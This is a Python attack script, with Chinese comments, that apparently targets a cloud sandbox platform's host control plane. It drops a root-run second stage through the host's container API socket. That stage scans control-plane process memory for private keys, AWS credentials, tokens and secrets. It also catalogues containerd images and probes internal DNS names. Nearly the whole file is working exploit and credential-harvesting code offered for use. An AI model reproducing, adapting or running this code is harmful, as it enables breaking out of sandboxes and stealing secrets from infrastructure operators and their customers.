# -*- coding: utf-8 -*-
"""v181 payload: root 后控制面内存侦察 + containerd 镜像 + VPC DNS 内部域名
输出 /vercel/sandbox/pwn181_out.txt + v181c.out"""
import socket, struct, time, json, os, signal, re, subprocess

OUT = '/vercel/sandbox/v181c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(272)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
PWN = '/vercel/sandbox/pwn181.py'
PWNOUT = '/vercel/sandbox/pwn181_out.txt'


def log(s, maxlen=4200):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


PWN_CODE = r'''#!/usr/bin/python3
import os, sys, re, socket, struct, time
OUT = '/vercel/sandbox/pwn181_out.txt'
def w(s):
    try:
        with open(OUT, 'a') as ff:
            ff.write(str(s) + '\n')
    except Exception:
        pass
os.setgid(0); os.setuid(0)
w('ROOT uid=%d' % os.getuid())

# 0. 找控制面进程
procs = {}
for d in os.listdir('/proc'):
    if d.isdigit():
        try:
            cmd = open('/proc/%s/cmdline' % d).read().replace('\x00', ' ')
            if any(x in cmd for x in ['celld', 'sandbox-init', 'sandboxctrl', 'containerd']):
                procs[d] = cmd[:100]
                w('PROC %s: %s' % (d, cmd))
        except Exception:
            pass

# 1. 控制面进程内存 grep (读 /proc/PID/mem 按 maps)
KWS = [b'BEGIN.*PRIVATE KEY', b'AKIA', b'ASIA', b'aws_', b'token', b'secret', b'api_key',
       b'apikey', b'Bearer ', b'Authorization', b'client_secret', b'mongodb', b'redis',
       b'cell_id', b'--pubkey', b'ed25519', b'signing']
def mem_grep(pid, kws, limit=40):
    try:
        maps = open('/proc/%s/maps' % pid).read().splitlines()
        hits = 0
        for ln in maps:
            if hits >= limit:
                break
            p = ln.split()
            if len(p) < 6:
                continue
            if 'r' not in p[1]:
                continue
            if '[' in p[5]:
                continue
            # 只读可读堆/栈/文件映射
            a, b = p[0].split('-')
            start = int(a, 16)
            end = int(b, 16)
            if end - start > 64 * 1024 * 1024:
                start2 = end - 64 * 1024 * 1024
            else:
                start2 = start
            try:
                with open('/proc/%s/mem' % pid, 'rb', 0) as mf:
                    mf.seek(start2)
                    chunk = mf.read(end - start2)
                for kw in kws:
                    if kw in chunk:
                        for mm in re.finditer(kw, chunk):
                            i = mm.start()
                            seg = chunk[max(0, i - 50):i + 150]
                            printable = sum(1 for c in seg if 32 <= c < 127 or c in (9, 10, 13))
                            if printable * 10 < len(seg) * 4:
                                continue
                            w('MEM %s %r @%x: %r' % (pid, kw, start2 + i, seg))
                            hits += 1
                            if hits >= limit:
                                break
                        if hits >= limit:
                            break
            except Exception:
                pass
        w('MEM %s done hits=%d' % (pid, hits))
    except Exception as e:
        w('MEM %s EXC %s' % (pid, e))

for pid in ['1', '577', '537', '491']:
    mem_grep(pid, KWS, limit=25)

# 2. containerd content store 镜像列表
try:
    base = '/mnt/var/lib/containerd/io.containerd.content.v1.content/blobs/sha256'
    blobs = sorted(os.listdir(base))
    w('BLOBS count=%d' % len(blobs))
    # 找 manifest (json 类型, 内容含 config/layers)
    for b in blobs[:200]:
        try:
            p = os.path.join(base, b)
            d = open(p, 'rb').read()
            if d[:1] == b'{' and b'config' in d[:2000] and b'layers' in d[:4000]:
                w('MANIFEST %s (%d): %r' % (b, len(d), d[:600]))
        except Exception:
            pass
except Exception as e:
    w('BLOBS EXC %s' % e)

# 3. containerd metadata (镜像列表)
try:
    meta = '/mnt/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db'
    d = open(meta, 'rb').read()
    w('META db (%d) head: %r' % (len(d), d[:200]))
    # 提取镜像名
    for mm in re.finditer(rb'[A-Za-z0-9._-]+\.(?:dkr\.ecr|amazonaws\.com)[/A-Za-z0-9._:@-]{5,120}', d):
        w('META IMG: %r' % mm.group(0)[:120])
except Exception as e:
    w('META EXC %s' % e)

# 4. VPC DNS 内部域名查询
def dns_q(name, srv='172.31.0.2'):
    try:
        q = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
        for part in name.split('.'):
            q += bytes([len(part)]) + part.encode()
        q += b'\x00\x00\x01\x00\x01'
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        s.sendto(q, (srv, 53))
        d, a = s.recvfrom(1024)
        s.close()
        # 解析 A 记录
        ips = []
        if len(d) > 12:
            ans = d[12:]
            # 简化: 找 4 字节 IP 模式
            for mm in re.finditer(rb'\xc0\x0c\x00\x01\x00\x01', ans):
                i = mm.start()
                if i + 16 <= len(ans):
                    ip = socket.inet_ntoa(ans[i + 12:i + 16])
                    ips.append(ip)
        return '%d bytes ips=%r' % (len(d), ips)
    except Exception as e:
        return 'EXC %s' % e

for name in ['vercel.internal', 'vercel.com', 'cell.vercel.internal', 'sandbox.vercel.internal',
             'api.vercel.internal', 'hive.vercel.internal', 'metadata.google.internal',
             'ec2.internal', 'instance-data.ec2.internal']:
    w('DNSQ %s -> %s' % (name, dns_q(name)))

# 5. 云 agent / IMDS 替代
for p in ['/mnt/var/lib/cloud', '/mnt/etc/ec2', '/mnt/var/log/cloud-init.log']:
    try:
        if os.path.isdir(p):
            w('LS %s: %r' % (p, sorted(os.listdir(p))[:20]))
        elif os.path.exists(p):
            w('RD %s (%d)' % (p, os.path.getsize(p)))
    except Exception as e:
        w('CLOUD %s EXC %s' % (p, e))

w('PWN181_DONE')
'''

# ============ 1: 写 pwn ============
log('=== 1 write ===')
try:
    open(PWN, 'w').write(PWN_CODE)
    os.chmod(PWN, 0o755)
    log('pwn written %d' % os.path.getsize(PWN))
except Exception as e:
    log('PWN EXC %s' % e)

# ============ 2: Create + Start ============
log('=== 2 create ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': PWN}).encode(), t=8)
log('Create -> %s %r' % (st, pay[:150]))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
if cid:
    st2, pay2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    log('Start -> %s %r' % (st2, pay2[:100]))

# ============ 3: 轮询 ============
log('=== 3 poll ===')
t0 = time.time()
seen = ''
while time.time() - t0 < 55:
    time.sleep(0.5)
    try:
        if os.path.exists(PWNOUT):
            cur = open(PWNOUT, errors='replace').read()
            if cur != seen:
                seg = cur[len(seen):] if cur.startswith(seen) else cur
                seen = cur
                for i in range(0, len(seg), 3900):
                    log('PWNSEG %d:\n%s' % (i, seg[i:i + 3900]))
            if 'PWN181_DONE' in cur:
                break
    except Exception as e:
        log('POLL EXC %s' % e)
log('poll end %d' % len(seen))

log('V181_DONE')
f.close()
